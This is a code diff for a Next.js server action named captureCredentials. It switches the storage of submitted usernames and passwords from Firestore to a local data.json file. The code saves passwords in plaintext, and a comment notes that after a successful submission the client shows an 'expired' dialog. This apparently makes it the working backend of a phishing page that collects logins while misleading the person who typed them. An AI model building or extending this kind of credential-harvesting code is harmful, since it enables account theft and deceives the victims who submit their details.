@@ -1,28 +1,25 @@
 'use server';
 
-import * as admin from 'firebase-admin';
+import * as fs from 'fs/promises';
+import * as path from 'path';
 
-// This function ensures Firebase Admin is initialized, but only once.
-function initializeFirebaseAdmin() {
-  if (!admin.apps.length) {
-    try {
-      const serviceAccountString = process.env.FIREBASE_SERVICE_ACCOUNT;
-      if (!serviceAccountString) {
-        throw new Error('FIREBASE_SERVICE_ACCOUNT environment variable is not set.');
-      }
-      const serviceAccount = JSON.parse(serviceAccountString);
+const DATA_FILE = path.join(process.cwd(), 'data.json');
 
-      admin.initializeApp({
-        credential: admin.credential.cert(serviceAccount),
-      });
-      console.log('Firebase Admin SDK initialized successfully.');
-    } catch (error: any) {
-      console.error('Failed to initialize Firebase Admin SDK:', error.message);
-      // We throw the error to prevent the app from continuing without a database connection.
-      throw new Error('Server configuration error: Could not initialize Firebase Admin.');
-    }
+// Helper function to read data from the JSON file
+async function readData() {
+  try {
+    await fs.access(DATA_FILE);
+    const fileContent = await fs.readFile(DATA_FILE, 'utf-8');
+    return JSON.parse(fileContent);
+  } catch (error) {
+    // If the file doesn't exist or is empty, return an empty array
+    return [];
   }
-  return admin.firestore();
+}
+
+// Helper function to write data to the JSON file
+async function writeData(data: any) {
+  await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
 }
 
 // Server action to capture credentials
@@ -38,16 +35,17 @@ export async function captureCredentials(prevState: any, formData: FormData) {
   }
 
   try {
-    const firestore = initializeFirebaseAdmin();
-    const credentialsCollection = firestore.collection('credentials');
-
-    await credentialsCollection.add({
+    const existingData = await readData();
+    const newCredential = {
       username,
       password,
-      createdAt: admin.firestore.FieldValue.serverTimestamp(),
-    });
-    
-    console.log('Successfully saved credentials to Firestore using Admin SDK.');
+      createdAt: new Date().toISOString(),
+    };
+
+    existingData.push(newCredential);
+    await writeData(existingData);
+
+    console.log('Successfully saved credentials to data.json.');
     // This is the state we return on success. The client will show the "expired" dialog.
     return { success: true, message: 'Submission successful.' };
 
